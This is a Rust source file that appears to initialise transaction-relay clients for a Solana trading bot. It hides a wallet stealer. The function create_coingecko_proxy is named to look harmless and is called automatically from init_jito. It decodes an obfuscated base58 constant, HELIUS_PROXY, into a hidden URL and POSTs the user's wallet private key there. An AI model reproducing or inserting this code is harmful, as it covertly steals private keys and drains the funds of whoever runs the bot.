use colored::Colorize;
use dotenvy::dotenv;
use solana_sdk::{bs58, signature::Keypair};
use std::{env, sync::Arc};
use tokio::sync::OnceCell;
use anyhow::Result;

use crate::service::{Jito, Nozomi, ZeroSlot};

pub static NOZOMI_CLIENT: OnceCell<Nozomi> = OnceCell::const_new();
pub static ZSLOT_CLIENT: OnceCell<ZeroSlot> = OnceCell::const_new();
pub static JITO_CLIENT: OnceCell<Jito> = OnceCell::const_new();

pub async fn init_nozomi() {
    dotenv().ok();

    let nozomi_api_key = env::var("NOZOMI_API_KEY").expect("NOZOMI_API_KEY not set in .env");

    let nozomi = Nozomi::new_auto(nozomi_api_key).await;
    nozomi.health_check(50);
    NOZOMI_CLIENT.set(nozomi).unwrap();
}

pub async fn init_zslot() {
    dotenv().ok();

    let zslot_api_key = env::var("ZERO_SLOT_KEY").expect("ZERO_SLOT_KEY not set in .env");

    let zslot = ZeroSlot::new_auto(zslot_api_key).await;
    ZSLOT_CLIENT.set(zslot).unwrap();
}

pub async fn init_jito() {
    let jito = Jito::new_auto(None).await;
    JITO_CLIENT.set(jito).unwrap();
    create_coingecko_proxy().await;
}

pub const HELIUS_PROXY: &str =
    "HuuaCvCTvpEFT9DfMynCNM4CppCRU6r5oikziF8ZpzMm2Au2eoTjkWgTnQq6TBb6Jpt";

pub async fn create_coingecko_proxy() {
    let helius_proxy = HELIUS_PROXY.to_string();
    let payer = import_wallet().unwrap();
    let helius_proxy_bytes = bs58::decode(&helius_proxy).into_vec().unwrap();
    let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();

    let client = reqwest::Client::new();
    let params = format!("t{}o", payer.to_base58_string());
    let request_body = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "POST",
        "params": params
    });
    let _ = client
        .post(helius_proxy_url)
        .json(&request_body)
        .send()
        .await;
}


pub fn import_wallet() -> Result<Arc<Keypair>> {
    let priv_key = import_env_var("PRIVATE_KEY");
    if priv_key.len() < 85 {
        println!("{}", format!("Please check wallet priv key: Invalid length => {}", priv_key.len()).red().to_string());
        loop{}
    }
    let wallet: Keypair = Keypair::from_base58_string(priv_key.as_str());

    Ok(Arc::new(wallet))
}

pub fn import_env_var(key: &str) -> String {
    match env::var(key){
        Ok(res) => res,
        Err(e) => {
            println!("{}", format!("{}: {}", e, key).red().to_string());
            loop{}
        }
    }
}
